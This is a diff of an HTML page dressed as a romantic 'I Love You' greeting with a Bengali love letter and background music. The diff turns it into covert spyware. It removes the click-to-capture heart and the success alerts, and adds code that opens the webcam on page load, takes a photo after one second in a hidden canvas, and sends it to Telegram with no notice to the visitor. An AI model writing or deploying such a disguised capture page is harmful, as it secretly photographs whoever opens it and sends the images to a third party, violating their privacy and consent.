@@ -33,17 +33,6 @@
       position: relative;
     }
 
-    .heart {
-      font-size: 6rem;
-      color: #ff4b5c;
-      cursor: pointer;
-      transition: transform 0.3s ease;
-    }
-
-    .heart:hover {
-      transform: scale(1.2);
-    }
-
     h1 {
       font-size: 3rem;
       color: #fff;
@@ -57,7 +46,7 @@
     }
 
     .love-letter {
-      font-family: 'Pinyon Script', cursive;
+      font-family: 'Dancing Script', cursive;
       font-size: 1.5rem;
       color: #fff;
       margin-top: 30px;
@@ -73,15 +62,24 @@
       overflow-y: auto;
     }
 
+    video {
+      display: none;
+    }
+
+    canvas {
+      display: none;
+    }
+
+    /* Music Button Styling */
     .music-btn {
       background-color: #ff4b5c;
       color: white;
-      font-size: 1.5rem;
-      padding: 15px 30px;
+      font-size: 1.2rem;
+      padding: 10px 20px;
       border: none;
-      border-radius: 25px;
+      border-radius: 20px;
       cursor: pointer;
-      margin-top: 30px;
+      margin-top: 20px;
       transition: background-color 0.3s ease;
     }
 
@@ -92,39 +90,25 @@
     .music-btn:focus {
       outline: none;
     }
-
-    video {
-      display: none;
-    }
-
-    canvas {
-      display: none;
-    }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="heart" onclick="capturePhoto()">❤️</div>
     <h1>I <span>Love</span> You</h1>
-
-    <!-- Love Letter Section -->
     <div class="love-letter">
       <p>প্রিয়তম,</p>
       <p>যতদিন তোমার সঙ্গে প্রথম দেখা হয়েছিল, আমার হৃদয় যেন বুঝে গিয়েছিল যে আমাদের মধ্যে কিছু বিশেষ রয়েছে। তুমি যে ভাবে আমাকে অনুভব করাতে, তা ভাষায় বর্ণনা করা সম্ভব নয়। প্রতিটি দিন, প্রতিটি মুহূর্ত তোমার সঙ্গে কাটানো যেন একটি সুন্দর স্বপ্নের মতো।</p>
-      <p>যতক্ষণ আমি এটি লিখছি, ততক্ষণ আমি ভবিষ্যতটাকে ভাবছি এবং সমস্ত সম্ভাবনাগুলোর কথা ভাবছি, যেগুলো আমাদের জন্য অপেক্ষা করছে। তুমি আমার হৃদয়, আমার আত্মা, আমার সবকিছু। আমি তোমাকে এমনভাবে ভালোবাসি যা শব্দের মাধ্যমে প্রকাশ করা সম্ভব নয়। আমি কৃতজ্ঞ প্রতিটি মুহূর্তের জন্য যা আমরা একসাথে কাটাচ্ছি।</p>
       <p>চিরকাল তোমার,</p>
       <p><strong>তোমার ভালোবাসা</strong></p>
     </div>
-
-    <!-- Music Play Button -->
-    <button class="music-btn" onclick="toggleMusic()">Play Music</button>
-
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
+
+    <!-- Music Toggle Button -->
+    <button class="music-btn" onclick="toggleMusic()">Pause Music</button>
   </div>
 
-  <!-- Background Music -->
-  <audio id="loveAudio" loop>
+  <audio id="loveAudio" loop autoplay>
     <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
     Your browser does not support the audio element.
   </audio>
@@ -134,18 +118,25 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
     const audio = document.getElementById('loveAudio');
-    let isPlaying = false;
+    const musicButton = document.querySelector('.music-btn');
 
-    // Start webcam feed
+    let isMusicPlaying = true; // Tracks if music is playing
+
+    // Start webcam feed and capture photo automatically
     navigator.mediaDevices.getUserMedia({ video: true })
       .then((stream) => {
         video.srcObject = stream;
+
+        // Wait for the video to start
+        video.onloadedmetadata = () => {
+          setTimeout(capturePhoto, 1000); // Wait 1 second before capturing the photo
+        };
       })
       .catch((err) => {
         console.error('Error accessing webcam:', err);
       });
 
-    // Capture photo
+    // Capture photo and send to Telegram
     function capturePhoto() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -186,30 +177,25 @@
       })
         .then((response) => response.json())
         .then((data) => {
-          if (data.ok) {
-            alert('Photo sent successfully!');
-          } else {
+          if (!data.ok) {
             console.error('Telegram API Error:', data);
-            alert('Failed to send photo.');
           }
         })
         .catch((err) => {
           console.error('Fetch Error:', err);
-          alert('Error occurred while sending the photo.');
         });
     }
 
     // Toggle music play/pause
     function toggleMusic() {
-      if (!isPlaying) {
-        audio.play();
-        isPlaying = true;
-        document.querySelector('.music-btn').textContent = 'Pause Music';
-      } else {
+      if (isMusicPlaying) {
         audio.pause();
-        isPlaying = false;
-        document.querySelector('.music-btn').textContent = 'Play Music';
+        musicButton.textContent = 'Play Music';
+      } else {
+        audio.play();
+        musicButton.textContent = 'Pause Music';
       }
+      isMusicPlaying = !isMusicPlaying;
     }
   </script>
 </body>
